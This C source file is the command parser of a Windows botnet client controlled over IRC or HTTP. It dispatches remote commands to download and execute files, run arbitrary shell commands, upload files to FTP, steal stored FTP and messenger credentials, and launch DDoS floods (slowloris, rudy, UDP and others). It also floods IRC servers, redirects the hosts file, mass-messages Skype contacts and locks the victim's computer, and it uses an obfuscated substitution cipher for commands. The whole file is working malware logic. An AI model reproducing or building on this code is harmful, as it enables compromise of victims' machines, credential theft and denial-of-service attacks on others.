#include "../Includes/includes.h"

bool HasSpaceCharacter(char *pcScanString) //Checks for any existing space characters in a given string
{
    for(unsigned int ui = 0; ui < strlen(pcScanString); ui++)
    {
        if(pcScanString[ui] == ' ')
            return TRUE;
    }

    return FALSE;
}

char cCharacterPoolOne[99] = "~!@#$%^&*()_+`1234567890-=qwertyuiop[]\\QWERTYUIOP{}|asdfghjkl;\'ASDFGHJKL:\"zxcvbnm,./ZXCVBNM<> ?";
char cCharacterPoolTwo[99] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890,./<>?;:\'\"[]\\{}|=-+_)(*&^%$#@!~` ";
char *DecryptCommand(char *pcCommand)
{
    for(unsigned int ui = 0; ui <= strlen(pcCommand); ui++)
    {
        for(unsigned short us = 0; us <= strlen(cCharacterPoolTwo); us++)
        {
            if(pcCommand[ui] == cCharacterPoolTwo[us])
            {
                pcCommand[ui] = cCharacterPoolOne[us];
                break;
            }
        }
    }

    return pcCommand;
}

void ParseCommand(char *pcCommand) //Parses an already-processed raw command
{
    pcCommand = StripReturns(pcCommand);

    char cFullCommand[DEFAULT];
    strcpy(cFullCommand, pcCommand);

    char *pcArguments = strstr(cFullCommand, " ") + 1;
    char *pcCheckCommand = strtok(pcCommand, " ");

    //printf("Full Command: \'%s\'\n", cFullCommand);
    //printf("Command Name: \'%s\'\n", pcCheckCommand);
    //printf("Arguments: \'%s\'\n", pcArguments);
    //printf("Task ID: %i\n", nCurrentTaskId);
    //system("pause");

    if(HasSpaceCharacter(cFullCommand))
    {
#ifndef HTTP_BUILD
        if(strstr(pcCheckCommand, "decrypt"))
        {
            char cDecryptedCommand[MAX_IRC_SND_BUFFER];
            bool bValidCommand = FALSE;

            for(unsigned short us = 0; us < 500; us++)
            {
                strcpy(cDecryptedCommand, DecryptCommand(pcArguments));

                if(cDecryptedCommand[0] == '@' && cDecryptedCommand[1] == '*' && cDecryptedCommand[2] == '@' && cDecryptedCommand[3] == '!')
                {
                    bValidCommand = TRUE;
                    break;
                }
            }

            if(bValidCommand)
            {
                char *pcSendDecryptedCommand = cDecryptedCommand + 4;
                ParseCommand(pcSendDecryptedCommand);
            }
            else
                SendEncryptedCommandFailed();
        }
#endif

        if(strstr(pcCheckCommand, "download"))
        {
            if((strstr(pcArguments, "http")) && (strstr(pcArguments, "://")))
            {
                bool bValidParameters = TRUE;

                pcCheckCommand += 9;

                bUpdate = FALSE;
                bExecutionArguments = FALSE;

                if(strstr(pcCheckCommand, "update"))
                    bUpdate = TRUE;
                else if(strstr(pcCheckCommand, "abort"))
                {
                    strcpy(cStoreParameter, pcArguments);
                    bDownloadAbort = TRUE;
                }
                else if(strstr(pcCheckCommand, "arguments"))
                    bExecutionArguments = TRUE;

                if(strstr(pcCheckCommand, "getmd5") && !bExecutionArguments && !bDownloadAbort && !bUpdate)
                    bGlobalOnlyOutputMd5Hash = TRUE;
                else if(strstr(pcCheckCommand, "md5"))
                    bMd5MustMatch = TRUE;

                if(!bDownloadAbort)
                {
                    char *pcBreakString = strtok(pcArguments, " ");

                    if(pcBreakString != NULL)
                        strcpy(cDownloadFromLocation, pcArguments);
                    else
                        bValidParameters = FALSE;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        dwStoreParameter = atoi(pcBreakString);
                    else
                        bValidParameters = FALSE;

                    if(dwStoreParameter < 1)
                        bValidParameters = FALSE;

                    if(bMd5MustMatch && !bGlobalOnlyOutputMd5Hash)
                    {
                        pcBreakString = strtok(NULL, " ");
                        if(pcBreakString != NULL)
                            strcpy(szMd5Match, pcBreakString);
                        else
                            bValidParameters = FALSE;
                    }

                    if(bExecutionArguments)
                    {
                        pcBreakString = strtok(NULL, " ");
                        if(pcBreakString == NULL)
                            bValidParameters = FALSE;

                        strcpy(cStoreParameter, pcBreakString);

                        do
                        {
                            pcBreakString = strtok(NULL, " ");

                            if(pcBreakString != NULL)
                            {
                                strcat(cStoreParameter, " ");
                                strcat(cStoreParameter, pcBreakString);
                            }
                        }
                        while(pcBreakString != NULL);
                    }

                    if(bValidParameters)
                    {
                        HANDLE hThread = CreateThread(NULL, NULL, DownloadExecutableFile, NULL, NULL, NULL);

                        if(!hThread)
                        {
#ifndef HTTP_BUILD
                            SendThreadCreationFail();
#endif
                        }
                        else
                            CloseHandle(hThread);
                    }
                    else
                    {
#ifndef HTTP_BUILD
                        SendInvalidParameters();
#endif

                        bGlobalOnlyOutputMd5Hash = FALSE;
                        bMd5MustMatch = FALSE;
                        bExecutionArguments = FALSE;
                        bDownloadAbort = FALSE;
                        bUpdate = FALSE;
                        memset(szMd5Match, 0, sizeof(szMd5Match));
                    }
                }
            }
            else
            {
#ifndef HTTP_BUILD
                SendInvalidParameters();
#endif
            }
        }
#ifndef HTTP_BUILD
        else if(strstr(pcCheckCommand, "md5"))
        {
            char szMd5[150];
            memset(szMd5, 0, sizeof(szMd5));

            StringToHash(pcArguments, szMd5, sizeof(szMd5));

            sprintf(cSend, "%s %s :%s MD5: [Hash: %s]", cIrcCommandPrivmsg, cChannel, cIrcResponseOk, szMd5);
            SendToIrc(cSend);
        }
#endif
        else if(strstr(pcCheckCommand, "shell"))
        {
            system(pcArguments);
#ifndef HTTP_BUILD
            SendShellCommandSubmitted(pcArguments);
#else
            for(unsigned short us = 0; us < 6; us++)
            {
                if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                    break;

                Sleep(10000);
            }
#endif
        }
#ifndef HTTP_BUILD
#ifdef INCLUDE_FILESEARCH
        else if(strstr(pcCheckCommand, "ftp.upload"))
        {
            char *pcBreakString = strtok(pcArguments, " ");

            bool bValidParameters = TRUE;

            if(pcBreakString != NULL)
            {
                if(strstr(pcBreakString, "."))
                    strcpy(cFtpHost, pcBreakString);
                else
                    bValidParameters = FALSE;
            }
            else
                bValidParameters = FALSE;

            pcBreakString = strtok(NULL, " ");
            if(pcBreakString != NULL)
                strcpy(cFtpUser, pcBreakString);
            else
                bValidParameters = FALSE;

            pcBreakString = strtok(NULL, " ");
            if(pcBreakString != NULL)
                strcpy(cFtpPass, pcBreakString);
            else
                bValidParameters = FALSE;

            pcBreakString = strtok(NULL, " ");
            if(pcBreakString != NULL)
            {
                if((strstr(pcBreakString, ":")) && (strstr(pcBreakString, "\\")))
                {
                    strcpy(cStoreParameter, pcBreakString);

                    pcBreakString = strtok(NULL, " ");
                    while(pcBreakString != NULL)
                    {
                        strcat(cStoreParameter, " ");
                        strcat(cStoreParameter, pcBreakString);
                        pcBreakString = strtok(NULL, " ");
                    }
                }
                else
                    bValidParameters = FALSE;
            }
            else
                bValidParameters = FALSE;

            if(bValidParameters)
            {
                HANDLE hThread = CreateThread(NULL, NULL, FtpUploadFile, NULL, NULL, NULL);

                if(!hThread)
                    SendThreadCreationFail();
                else
                    CloseHandle(hThread);
            }
            else
                SendInvalidParameters();
        }
#endif
#ifdef INCLUDE_FILESEARCH
        else if(strstr(pcCheckCommand, "filesearch"))
        {
            strcpy(cStoreParameter, pcArguments);

            bOutputFileSearch = FALSE;

            if(strstr(pcCheckCommand, ".output"))
                bOutputFileSearch = TRUE;

            HANDLE hThread = CreateThread(NULL, NULL, FileSearch, NULL, NULL, NULL);

            if(!hThread)
                SendThreadCreationFail();
            else
                CloseHandle(hThread);
        }
#endif
        else if(strstr(pcCheckCommand, "irc"))
        {
            pcCheckCommand += 4;

            if(strstr(pcCheckCommand, "join"))
            {
                pcCheckCommand += 4;

                sprintf(cSend, "%s %s\r\n", cIrcCommandJoin, pcArguments);

                if(strstr(pcCheckCommand, "busy"))
                {
                    if(bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else if(strstr(pcCheckCommand, "free"))
                {
                    if(!bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else
                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
            }
            else if(strstr(pcCheckCommand, "part"))
            {
                pcCheckCommand += 4;

                sprintf(cSend, "%s %s\r\n", cIrcCommandPart, pcArguments);

                if(strstr(pcCheckCommand, "busy"))
                {
                    if(bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else if(strstr(pcCheckCommand, "free"))
                {
                    if(!bDdosBusy)
                        dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                }
                else
                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
            }
            else if(strstr(pcCheckCommand, "raw"))
            {
                SendToIrc(pcArguments);
            }
            else if(strstr(pcCheckCommand, "silent"))
            {
                if(strstr(pcArguments, "on"))
                    bSilent = TRUE;
                else if(strstr(pcArguments, "off"))
                    bSilent = FALSE;
            }
        }
#ifdef INCLUDE_IRCWAR
        else if(strstr(pcCheckCommand, "war."))
        {
            pcCheckCommand += 4;

            if(!bRemoteIrcBusy)
            {
                if(strstr(pcCheckCommand, "connect"))
                {
                    char *pcBreakString = strtok(pcArguments, " ");

                    bool bValidParameters = TRUE;

                    if(pcBreakString != NULL)
                    {
                        if(strstr(pcBreakString, "."))
                            strcpy(cRemoteHost, pcBreakString);
                        else
                            bValidParameters = FALSE;
                    }
                    else
                        bValidParameters = FALSE;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        usRemotePort = atoi(pcBreakString);
                    else
                        bValidParameters = FALSE;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        usRemoteAttemptConnections = atoi(pcBreakString);
                    else
                        bValidParameters = FALSE;

                    if(bValidParameters)
                    {
                        if(usRemoteAttemptConnections > 0 && usRemoteAttemptConnections <= MAX_WAR_CONNECTIONS)
                            StartIrcWar(cRemoteHost, usRemotePort);
                        else
                            SendInvalidParameters();
                    }
                    else
                        SendInvalidParameters();
                }
            }
            else
            {
                bool bValidCommand = FALSE;
                bool bCommandSubmitted = FALSE;

                if(strstr(pcCheckCommand, "raw"))
                {
                    strcpy(cBuild, pcArguments);
                    bValidCommand = TRUE;
                }
                else if(strstr(pcCheckCommand, "join"))
                {
                    strcpy(cBuild, cIrcCommandJoin);
                    strcat(cBuild, " ");
                    strcat(cBuild, pcArguments);
                    bValidCommand = TRUE;
                }
                else if(strstr(pcCheckCommand, "part"))
                {
                    strcpy(cBuild, cIrcCommandPart);
                    strcat(cBuild, " ");
                    strcat(cBuild, pcArguments);
                    bValidCommand = TRUE;
                }
                else if(strstr(pcCheckCommand, "msg"))
                {
                    if(HasSpaceCharacter(pcArguments))
                    {
                        strcpy(cBuild, cIrcCommandPrivmsg);
                        strcat(cBuild, " ");

                        strcpy(cStoreParameter, pcArguments);
                        char *pcBreakString = strtok(pcArguments, " ");
                        strcat(cBuild, pcBreakString);
                        strcat(cBuild, " :");

                        pcBreakString = cStoreParameter + strlen(pcBreakString) + 1;
                        strcat(cBuild, pcBreakString);

                        bValidCommand = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "notice"))
                {
                    if(HasSpaceCharacter(pcArguments))
                    {
                        strcpy(cBuild, "NOTICE ");

                        strcpy(cStoreParameter, pcArguments);
                        char *pcBreakString = strtok(pcArguments, " ");
                        strcat(cBuild, pcBreakString);
                        strcat(cBuild, " :");

                        pcBreakString = cStoreParameter + strlen(pcBreakString) + 1;
                        strcat(cBuild, pcBreakString);

                        bValidCommand = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "invite"))
                {
                    if(!HasSpaceCharacter(pcArguments))
                    {
                        strcpy(cStoreParameter, pcArguments);

                        HANDLE hThread = CreateThread(NULL, NULL, SendWarInvites, NULL, NULL, NULL);
                        if(!hThread)
                            SendThreadCreationFail();
                        else
                        {
                            bCommandSubmitted = TRUE;
                            CloseHandle(hThread);
                        }
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "ctcp"))
                {
                    if(!HasSpaceCharacter(pcArguments))
                    {
                        SendCtcpToWarIrc(pcArguments, FALSE);
                        bCommandSubmitted = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(strstr(pcCheckCommand, "dcc"))
                {
                    if(!HasSpaceCharacter(pcArguments))
                    {
                        SendCtcpToWarIrc(pcArguments, TRUE);
                        bCommandSubmitted = TRUE;
                    }
                    else
                        SendInvalidParameters();
                }
                else if(!bWarFlood)
                {
                    if(strstr(pcCheckCommand, "flood.channel"))
                    {
                        strcpy(cStoreParameter, pcCheckCommand);

                        if(strstr(pcCheckCommand, ".hop"))
                            StartChannelFlood(TRUE, pcArguments);
                        else
                            StartChannelFlood(FALSE, pcArguments);
                    }
                    else if(strstr(pcCheckCommand, "kill.user"))
                    {
                        strcpy(cStoreParameter, pcCheckCommand);
                        pcCheckCommand += 9;

                        if(strstr(pcCheckCommand, ".multi"))
                            StartUserFlood(TRUE, pcArguments);
                        else
                            StartUserFlood(FALSE, pcArguments);
                    }
                }

                if(bValidCommand)
                {
                    if(SendToAllWarIrcConnections(cBuild))
                        bCommandSubmitted = TRUE;
                }

                if(bCommandSubmitted)
                    SendSuccessfulWarSubmit(pcCheckCommand);
            }
        }
#endif
#endif
#ifdef INCLUDE_DDOS
        else if(strstr(pcCheckCommand, "ddos."))
        {
            pcCheckCommand += 5;

            if(strstr(pcCheckCommand, "browser"))
            {
                if(!bBrowserDdosBusy)
                {
                    bool bValidParameters = TRUE;

                    char *pcBreakString = strtok(pcArguments, " ");

                    if(pcBreakString != NULL)
                        strcpy(cStoreParameter, pcBreakString);
                    else
                        bValidParameters = FALSE;

                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        dwStoreParameter = atoi(pcBreakString);
                    else
                        bValidParameters = FALSE;

                    if((dwStoreParameter > 1) && (bValidParameters))
                    {
                        HANDLE hThread = CreateThread(NULL, NULL, MassBrowserDdos, NULL, NULL, NULL);

                        if(!hThread)
                        {
#ifndef HTTP_BUILD
                            SendThreadCreationFail();
#endif
                        }
                        else
                        {
                            bBrowserDdosBusy = TRUE;
                            CloseHandle(hThread);
                        }
                    }
                    else
                    {
#ifndef HTTP_BUILD
                        SendInvalidParameters();
#endif
                    }
                }
            }
            else
            {
                bool bBusy = FALSE;

                if(strstr(pcCheckCommand, "http."))
                {
                    if(bDdosBusy)
                        bBusy = TRUE;
                }
                else if(strstr(pcCheckCommand, "layer4."))
                {
                    if(bDdosBusy)
                        bBusy = TRUE;
                }
                else
                    bBusy = TRUE;

                if(!bBusy)
                {
                    char *pcBreakString = strtok(pcArguments, " ");

                    char cTargetUrl[strlen(pcBreakString)];
                    if(pcBreakString != NULL)
                        strcpy(cTargetUrl, pcBreakString);

                    unsigned short usTargetPort = 0;

                    if(!strstr(pcCheckCommand, "bandwith"))
                    {
                        pcBreakString = strtok(NULL, " ");
                        if(pcBreakString != NULL)
                            usTargetPort = atoi(pcBreakString);
                    }

                    DWORD dwAttackLength = 0;
                    pcBreakString = strtok(NULL, " ");
                    if(pcBreakString != NULL)
                        dwAttackLength = atoi(pcBreakString);

                    if((strstr(pcCheckCommand, "rapidget"))
                            || (strstr(pcCheckCommand, "rapidpost"))
                            || (strstr(pcCheckCommand, "slowpost"))
                            || (strstr(pcCheckCommand, "slowloris"))
                            || (strstr(pcCheckCommand, "rudy"))
                            || (strstr(pcCheckCommand, "arme"))
                            || (strstr(pcCheckCommand, "bandwith"))
                            || (strstr(pcCheckCommand, "combo"))
                            || (strstr(pcCheckCommand, "udp"))
                            || (strstr(pcCheckCommand, "ecf")))
                    {
                        if(strstr(pcCheckCommand, "bandwith"))
                            usTargetPort = 80;

                        if((strstr(cTargetUrl, ".")) && (usTargetPort < 65545) && (dwAttackLength > 0))
                        {
                            if((usTargetPort >= 0 && strstr(pcCheckCommand, "udp")) || (usTargetPort > 0 && !strstr(pcCheckCommand, "udp")))
                            {
                                if(!HandleDdosCommand(pcCheckCommand, (char*)cTargetUrl, usTargetPort, dwAttackLength))
                                {
#ifndef HTTP_BUILD
                                    SendDdosResult(FALSE, pcCheckCommand, cTargetUrl, usTargetPort, dwAttackLength);
#endif
                                }
                                else
                                {
#ifndef HTTP_BUILD
                                    SendDdosResult(TRUE, pcCheckCommand, cTargetUrl, usTargetPort, dwAttackLength);
#endif
                                }
                            }
                            else
                            {
#ifndef HTTP_BUILD
                                SendInvalidParameters();
#endif
                            }
                        }
                        else
                        {
#ifndef HTTP_BUILD
                            SendInvalidParameters();
#endif
                        }
                    }
                }
            }
        }
#endif
        else if(strstr(pcCheckCommand, "http"))
        {
            strcpy(cStoreParameter, pcArguments);

            if(strstr(pcCheckCommand, "status"))
            {
                HANDLE hThread = CreateThread(NULL, NULL, GetWebsiteStatus, NULL, NULL, NULL);

                if(!hThread)
                {
#ifndef HTTP_BUILD
                    SendThreadCreationFail();
#endif
                }
                else
                {
                    CloseHandle(hThread);
#ifdef HTTP_BUILD
                    Sleep(2500);
#endif
                }
            }

#ifndef HTTP_BUILD
#ifdef INCLUDE_HOSTBLOCK
            if(strstr(pcCheckCommand, "block"))
            {
                if(BlockHost(pcArguments))
                    SendSuccessfullyBlockedHost(pcArguments);
            }
            else if(strstr(pcCheckCommand, "redirect"))
            {
                bool bValidParameters = TRUE;

                char cOriginalHost[DEFAULT];
                char cRedirectToHost[DEFAULT];

                char *pcBreakString = strtok(pcArguments, " ");
                if(pcBreakString != NULL)
                {
                    if(strstr(pcBreakString, "."))
                        strcpy(cOriginalHost, pcBreakString);
                    else
                        bValidParameters = FALSE;
                }
                else
                    bValidParameters = FALSE;

                pcBreakString = strtok(NULL, " ");
                if(pcBreakString != NULL)
                {
                    if(strstr(pcBreakString, "."))
                        strcpy(cRedirectToHost, pcBreakString);
                    else
                        bValidParameters = FALSE;
                }
                else
                    bValidParameters = FALSE;

                if(bValidParameters)
                {
                    if(RedirectHost(cOriginalHost, cRedirectToHost))
                        SendSuccessfullyRedirectedHost(cOriginalHost, cRedirectToHost);
                }
                else
                    SendInvalidParameters();
            }
#endif
#endif
        }
#ifdef INCLUDE_VISIT
        else if(strstr(pcCheckCommand, "smartview"))
        {
            pcCheckCommand += 10;

            bool bValidParameters = TRUE;

            char *pcBreakString = strtok(pcArguments, " ");

            if(pcBreakString != NULL)
            {
                if(strstr(pcBreakString, "."))
                    strcpy(cStoreParameter, pcBreakString);
                else
                    bValidParameters = FALSE;
            }

            if(strstr(pcCheckCommand, "add"))
                dwSmartViewCommandType = SMARTVIEW_ADD_ENTRY;
            else if(strstr(pcCheckCommand, "del"))
                dwSmartViewCommandType = SMARTVIEW_DEL_ENTRY;
            else
                bValidParameters = FALSE;

            if(dwSmartViewCommandType == SMARTVIEW_ADD_ENTRY)
            {
                pcBreakString = strtok(NULL, " ");
                if(pcBreakString != NULL)
                    uiSecondsBeforeVisit = atoi(pcBreakString);
                else
                    bValidParameters = FALSE;

                pcBreakString = strtok(NULL, " ");
                if(pcBreakString != NULL)
                    uiSecondsAfterVisit = atoi(pcBreakString);
                else
                    bValidParameters = FALSE;

                if(bValidParameters)
                {
                    if(!SmartView())
                    {
#ifndef HTTP_BUILD
                        SendThreadCreationFail();
#endif
                    }
                }
                else
                {
#ifndef HTTP_BUILD
                    SendInvalidParameters();
#endif
                }
            }
            else if(dwSmartViewCommandType == SMARTVIEW_DEL_ENTRY)
                strcpy(cStoreParameter, pcArguments);
        }
#endif
#ifdef INCLUDE_VISIT
        else if(strstr(pcCheckCommand, "view"))
        {
            bool bHidden = FALSE;

            if(strstr(pcCheckCommand, ".hidden"))
                bHidden = TRUE;

            char *pcVisitReturn = SimpleVisit(pcArguments, bHidden);
            if(!strstr(pcVisitReturn, "ERR_FAILED_TO_START"))
            {
#ifndef HTTP_BUILD
                SendSimpleVisitSuccess(pcArguments, pcVisitReturn, bHidden);
#else
                for(unsigned short us = 0; us < 6; us++)
                {
                    if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                        break;

                    Sleep(10000);
                }
#endif
            }
            else
            {
#ifndef HTTP_BUILD
                SendWebsiteOpenFail(pcArguments);
#endif
            }
        }
#endif
#ifdef INCLUDE_SKYPE_MASS_MESSENGER
        else if(strstr(pcCheckCommand, "skype"))
        {
            char cSkypePath[MAX_PATH];
            memset(cSkypePath, 0, sizeof(cSkypePath));

            if(SkypeExists(cSkypePath, sizeof(cSkypePath)))
            {
                int nSentMessages = MassMessageSkypeContacts(cSkypePath, pcArguments);

#ifndef HTTP_BUILD
                SendSkypeMessagesSent(nSentMessages);
#else
                for(unsigned short us = 0; us < 6; us++)
                {
                    if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                        break;

                    Sleep(10000);
                }
#endif
            }
        }
#endif
    }
    else
    {
        if(strstr(pcCheckCommand, "lock"))
        {
#ifdef INCLUDE_LOCK
            pcCheckCommand += 5;

            if(strstr(pcCheckCommand, "off"))
            {
                if(bLockComputer)
                {
                    UnLockComputer();
#ifndef HTTP_BUILD
                    SendComputerUnLocked();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "on"))
            {
                if(!bLockComputer)
                {
                    LockComputer();
#ifndef HTTP_BUILD
                    SendComputerLocked();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
#endif
        }
#ifdef INCLUDE_BOTKILL
        else if(strstr(pcCheckCommand, "botkill"))
        {
            pcCheckCommand += 8;

            if(strstr(pcCheckCommand, "once"))
            {
                if(!bBotkill)
                {
                    bBotkillOnce = TRUE;
                    bBotkillInitiatedViaCommand = TRUE;
                    StartBotkiller();

#ifdef HTTP_BUILD
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "start"))
            {
                if(!bBotkill)
                {
                    StartBotkiller();
#ifndef HTTP_BUILD
                    SendBotkillerStarted();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "stop"))
            {
                if(bBotkill)
                {
                    bBotkill = FALSE;
#ifndef HTTP_BUILD
                    SendBotkillerStopped();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "stats"))
            {
#ifndef HTTP_BUILD
                SendBotkillCount(dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges);
#endif
            }
            else if(strstr(pcCheckCommand, "clear"))
            {
                dwKilledProcesses = 0;
                dwFileChanges = 0;
                dwRegistryKeyChanges = 0;
#ifndef HTTP_BUILD
                SendBotkillCleared();
#endif
            }
        }
#endif
#ifndef HTTP_BUILD
        else if(strstr(pcCheckCommand, "irc"))
        {
            pcCheckCommand += 4;

            if(strstr(pcCheckCommand, "unsort"))
            {
                for(unsigned short us = 0; us < 7; us++)
                {
                    strcpy(cSend, cIrcCommandPart);
                    strcat(cSend, " #");

                    if(us == 0)
                        strcat(cSend, GetCountry());
                    else if(us == 1)
                    {
                        if(IsAdmin())
                            strcat(cSend, "Admin");
                        else
                            strcat(cSend, "User");
                    }
                    else if(us == 2)
                    {
                        if(IsLaptop())
                            strcat(cSend, "Laptop");
                        else
                            strcat(cSend, "Desktop");
                    }
                    else if(us == 3)
                        strcat(cSend, GetOs());
                    else if(us == 4)
                    {
                        strcat(cSend, "x");

                        if(Is64Bits(GetCurrentProcess()))
                            strcat(cSend, "64");
                        else
                            strcat(cSend, "86");
                    }
                    else if(us == 5)
                    {
                        strcat(cSend, "DotNET-");
                        strcat(cSend, GetVersionMicrosoftDotNetVersion());
                    }
                    else if(us == 6)
                        strcat(cSend, cVersion);

                    SendToIrc(cSend);
                }
            }
            else if(strstr(pcCheckCommand, "sort"))
            {
                bool bSendJoin = TRUE;

                pcCheckCommand += 5;

                strcpy(cSend, cIrcCommandJoin);
                strcat(cSend, " #");

                if(strstr(pcCheckCommand, "country"))
                    strcat(cSend, GetCountry());
                else if(strstr(pcCheckCommand, "privelages"))
                {
                    if(IsAdmin())
                        strcat(cSend, "Admin");
                    else
                        strcat(cSend, "User");
                }
                else if(strstr(pcCheckCommand, "gender"))
                {
                    if(IsLaptop())
                        strcat(cSend, "Laptop");
                    else
                        strcat(cSend, "Desktop");
                }
                else if(strstr(pcCheckCommand, "os"))
                    strcat(cSend, GetOs());
                else if(strstr(pcCheckCommand, "architecture"))
                {
                    strcat(cSend, "x");

                    if(Is64Bits(GetCurrentProcess()))
                        strcat(cSend, "64");
                    else
                        strcat(cSend, "86");
                }
                else if(strstr(pcCheckCommand, "dotnet"))
                {
                    strcat(cSend, "DotNET-");
                    strcat(cSend, GetVersionMicrosoftDotNetVersion());
                }
                else if(strstr(pcCheckCommand, "version"))
                    strcat(cSend, cVersion);
                else
                    bSendJoin = FALSE;

                strcat(cSend, "\r\n");

                if(bSendJoin)
                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
            }
            else if(strstr(pcCheckCommand, "reconnect"))
            {
                strcpy(cSend, "QUIT Reconnecting\r\n");
                dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                Sleep(15000);
                dwConnectionReturn = -1;
            }
        }
#endif
#ifdef INCLUDE_DDOS
        else if(strstr(pcCheckCommand, "ddos."))
        {
            pcCheckCommand += 5;

            if(strstr(pcCheckCommand, "stop"))
            {
                if(strstr(pcCheckCommand, "browser"))
                    bBrowserDdosBusy = FALSE;
                else if(bDdosBusy)
                    bDdosBusy = FALSE;
            }
        }
#endif
#ifdef INCLUDE_FILESEARCH
        else if(strstr(pcCheckCommand, "filesearch.stop"))
            bBusyFileSearching = FALSE;
#endif
#ifdef INCLUDE_VISIT
        else if(strstr(pcCheckCommand, "smartview"))
        {
            pcCheckCommand += 10;

            if(strstr(pcCheckCommand, "clear"))
            {
                if(uiWebsitesInQueue > 0)
                {
#ifndef HTTP_BUILD
                    SendClearSmartViewQueue(uiWebsitesInQueue);
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }

                dwSmartViewCommandType = SMARTVIEW_CLEAR_QUEUE;
            }
        }
#endif
        else if(strstr(pcCheckCommand, "uninstall"))
        {
#ifdef HTTP_BUILD
            nUninstallTaskId = nCurrentTaskId;
#endif
            bUninstallProgram = TRUE;
        }
#ifndef HTTP_BUILD
#ifdef INCLUDE_RECOVERY
        else if(strstr(pcCheckCommand, "recovery"))
        {
            pcCheckCommand += 9;

            if(strstr(pcCheckCommand, "ftp"))
            {
                HANDLE hThread = CreateThread(NULL, NULL, RecoverFtp, NULL, NULL, NULL);

                if(!hThread)
                    SendThreadCreationFail();
                else
                    CloseHandle(hThread);
            }
            else if(strstr(pcCheckCommand, "im"))
            {
                HANDLE hThread = CreateThread(NULL, NULL, RecoverIm, NULL, NULL, NULL);

                if(!hThread)
                    SendThreadCreationFail();
                else
                    CloseHandle(hThread);
            }
            else if(strstr(pcCheckCommand, "browser"))
            {

            }
        }
#endif
#ifdef INCLUDE_IRCWAR
        else if(strstr(pcCheckCommand, "war"))
        {
            pcCheckCommand += 4;

            if(bRemoteIrcBusy)
            {
                if(strstr(pcCheckCommand, "status"))
                    SendWarStatus(dwValidatedConnectionsToIrc, cCurrentWarStatus);
                else if(strstr(pcCheckCommand, "register"))
                {
                    if(strstr(pcCheckCommand, "stop"))
                    {
                        bRegisterOnWarIrc = FALSE;
                        SendAbortRegisterNickname();
                    }
                    else
                    {
                        HANDLE hThread = CreateThread(NULL, NULL, RegisterWithWarIrc, NULL, NULL, NULL);
                        if(hThread)
                            CloseHandle(hThread);
                    }
                }
                else if(strstr(pcCheckCommand, "disconnect"))
                    DisconnectFromWarIrc();
                else if(strstr(pcCheckCommand, "newnick"))
                {
                    SetNewWarNicknames();
                    SendSuccessfulWarSubmit(pcCheckCommand);
                }
                else if(strstr(pcCheckCommand, "stop"))
                    bWarFlood = FALSE;
                else if(!bWarFlood)
                {
                    if(strstr(pcCheckCommand, "flood.anope"))
                    {
                        strcpy(cStoreParameter, pcCheckCommand);
                        StartAnopeFlood();
                    }
                }
            }
        }
#endif
#ifndef HTTP_BUILD
#ifdef INCLUDE_HOSTBLOCK
        else if(strstr(pcCheckCommand, "hosts.restore"))
        {
            if(RestoreHostsFile())
                SendSuccessfullyRestoredHostsFile();
        }
#endif
#endif
        else if(strstr(pcCheckCommand, "version"))
        {
            char szMd5[150];
            memset(szMd5, 0, sizeof(szMd5));
            GetMD5Hash(cFileSaved, szMd5, sizeof(szMd5));

            sprintf(cSend, "%s %s :|| %s || 10MD5: %s || 10Executed From: %s ||", cIrcCommandPrivmsg, cChannel, cVersion, szMd5, cThisFile);
            SendToIrc(cSend);
        }
        else if(strstr(pcCheckCommand, "info"))
        {
            sprintf(cSend, "%s %s :|| 10Uptime: %s || 10Idletime: %s || 10Key: %s || 10.NET: %s || 10RAM Usage: %ld%%",
                    cIrcCommandPrivmsg, cChannel, GetUptime(), GetIdleTime(), cRegistryKeyAccess, GetVersionMicrosoftDotNetVersion(), GetMemoryLoad());
            SendToIrc(cSend);
        }
#endif
    }

    return;
}
